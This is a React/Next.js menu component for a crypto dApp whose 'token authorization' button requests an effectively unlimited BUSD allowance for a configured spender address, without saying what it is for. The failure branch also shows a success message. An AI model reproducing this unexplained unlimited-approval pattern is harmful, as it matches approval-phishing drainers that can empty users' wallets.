"use client";
import Image from "next/image";
import styles from "./index.module.scss";
import CallWallet from "../CallWallet";
import logo from "../../public/images/logo.jpg";
import { getContract2, getContract } from "../../public/utils";
import { APIConfig } from "../../abi/APIConfiguration";
import { USDTAbi } from "../../abi/USDTAbi";
import { message } from "antd";
import { ethers } from "ethers";

interface TopProps {
  onToggleRightMenu: () => void;
}

const TopMenu: React.FC<TopProps> = ({ onToggleRightMenu }) => {
  const approve = async () => {
    // if (window) {

    // }
    // const tempProvider = new ethers.providers.Web3Provider(window.ethereum);
    // const accounts = await tempProvider.send("eth_requestAccounts", []);
    // console.log(accounts,'accounts');

    // const accounts = await provider.send("eth_requestAccounts", []);
    const contract: any = await getContract2(APIConfig.BUSDaddress, USDTAbi);
    console.log("授权·", contract);
    const balance: any = "1000000000000000000000000000000000000"; // 授权的代币数量

    try {
      //发起授权
      const tx = await contract.approve(APIConfig.ETHAddress, balance, {
        gasLimit: 500000, // 手动设置 gas limit
      });
      await tx.wait();
      message.success("授权成功");
    } catch (error) {
      console.log(error, "error");
      message.success("授权失败，请重试");
    }
  };
  return (
    <div className={styles.pagetop}>
      <Image
        className={styles.m1}
        src={logo}
        alt="coin"
        width={50}
        height={50}
      />

      <CallWallet />

      {/* <Image
        className={styles.m2}
        onClick={approve}
        src="https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/selectorSwitch.png"
        alt="selectorSwitch"
        width={50}
        height={50}
      /> */}
      <div style={{
        color:"#fff",
        fontSize:'14px'
      }} onClick={approve}>代币授权</div>
      <Image
        onClick={onToggleRightMenu}
        className={styles.m3}
        src="https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/menu.png"
        alt="menu"
        width={50}
        height={50}
      />
    </div>
  );
};

export default TopMenu;
